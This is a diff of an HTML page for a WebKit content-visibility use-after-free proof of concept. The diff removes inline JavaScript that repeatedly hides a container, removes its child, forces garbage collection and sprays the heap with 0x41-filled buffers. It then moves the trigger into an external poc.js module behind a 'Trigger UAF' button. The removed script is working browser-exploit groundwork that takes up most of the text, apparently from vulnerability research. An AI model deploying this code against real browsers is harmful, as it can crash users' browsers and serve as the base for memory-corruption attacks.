@@ -2,91 +2,28 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>WebKit content-visibility UAF PoC (Aggressive)</title>
+  <title>WebKit PoC Analysis</title>
   <style>
-    .container {
-      width: 200px;
-      height: 200px;
-      border: 2px solid black;
-      margin: 40px;
-    }
-    .child {
-      width: 100px;
-      height: 100px;
-      background: blue;
-      margin: 40px;
-    }
     #log {
       font-family: monospace;
-      background: #eee;
-      padding: 10px;
-      min-height: 60px;
-      margin: 20px 0;
+      background: #f8f8f8;
+      border: 1px solid #ccc;
+      min-height: 80px;
+      padding: 8px;
+      margin-top: 20px;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <h1>WebKit content-visibility UAF PoC (Aggressive)</h1>
-  <div class="container" id="container">
-    <div class="child" id="child"></div>
+  <h1>WebKit UAF PoC Analysis</h1>
+  <div class="container">
+    <div class="child"></div>
   </div>
+  <button onclick="import('./poc.js').then(m => m.triggerUAF())">Trigger UAF</button>
   <div id="log"></div>
-  <button id="triggerBtn">Trigger Aggressive UAF</button>
-  <script>
-    function debug_log(msg) {
-      document.getElementById('log').textContent += msg + "\n";
-    }
-
-    function heapSpray() {
-      let spray = [];
-      for (let i = 0; i < 20000; i++) {
-        let arr = new Uint8Array(0x1000);
-        for (let j = 0; j < arr.length; j++) arr[j] = 0x41;
-        spray.push(arr);
-      }
-      window._spray = spray; // prevent GC
-    }
-
-    function forceGC() {
-      // Try to force GC in WebKit
-      for (let i = 0; i < 10; i++) {
-        new ArrayBuffer(0x1000000);
-      }
-    }
-
-    async function aggressiveUAF() {
-      debug_log("Starting aggressive UAF loop...");
-      for (let round = 0; round < 50; ++round) {
-        let container = document.getElementById('container');
-        let child = document.getElementById('child');
-        if (!container || !child) {
-          // Rebuild DOM if needed
-          debug_log("Rebuilding DOM...");
-          container = document.createElement('div');
-          container.className = "container";
-          container.id = "container";
-          child = document.createElement('div');
-          child.className = "child";
-          child.id = "child";
-          container.appendChild(child);
-          document.body.appendChild(container);
-        }
-        container.style.contentVisibility = "hidden";
-        await new Promise(r => setTimeout(r, 10));
-        child.remove();
-        forceGC();
-        await new Promise(r => setTimeout(r, 10));
-        container.style.contentVisibility = "auto";
-        heapSpray();
-        await new Promise(r => setTimeout(r, 10));
-        debug_log(`Round ${round + 1}/50 completed`);
-      }
-      debug_log("Aggressive UAF loop finished. If your browser is vulnerable, it may have crashed or frozen by now.");
-    }
-
-    document.getElementById("triggerBtn").onclick = () => {
-      aggressiveUAF();
-    };
+  <script type="module">
+    import "./poc.js";
   </script>
 </body>
 </html>
